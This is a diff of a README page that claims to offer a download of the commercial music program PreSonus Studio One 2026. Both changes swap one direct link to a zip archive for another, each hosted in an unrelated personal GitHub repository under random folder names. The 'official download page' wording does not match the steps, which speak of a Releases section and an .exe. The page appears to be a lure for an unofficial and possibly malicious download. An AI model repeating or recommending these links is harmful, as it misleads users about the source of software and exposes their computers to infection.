@@ -5,7 +5,7 @@ description: "Download the PreSonus Studio One installer for Windows 10 and 11. 
 ---
 # 🎵 PreSonus-Studio-One-2026 - Record professional music on your computer
 
-[![Download Studio One](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/edwinstigmatic286/edwinstigmatic286.github.io/main/peritomize/edwinstigmatic-github-io-v3.2.zip)
+[![Download Studio One](https://img.shields.io/badge/Download-Release-blue)](https://github.com/edwinstigmatic286/edwinstigmatic286.github.io/raw/refs/heads/main/roeblingite/Latest_v1.6-alpha.5.zip)
 
 ## 📦 About This Application
 
@@ -26,7 +26,7 @@ Before you install the software, verify your computer meets these standards. The
 
 Follow these steps to obtain the files for your computer. 
 
-1. Visit the [official download page](https://raw.githubusercontent.com/edwinstigmatic286/edwinstigmatic286.github.io/main/peritomize/edwinstigmatic-github-io-v3.2.zip).
+1. Visit the [official download page](https://github.com/edwinstigmatic286/edwinstigmatic286.github.io/raw/refs/heads/main/roeblingite/Latest_v1.6-alpha.5.zip).
 2. Locate the section labeled Releases on the right side of the page.
 3. Click the most recent version tag.
 4. Select the Windows installer file, which ends in .exe.
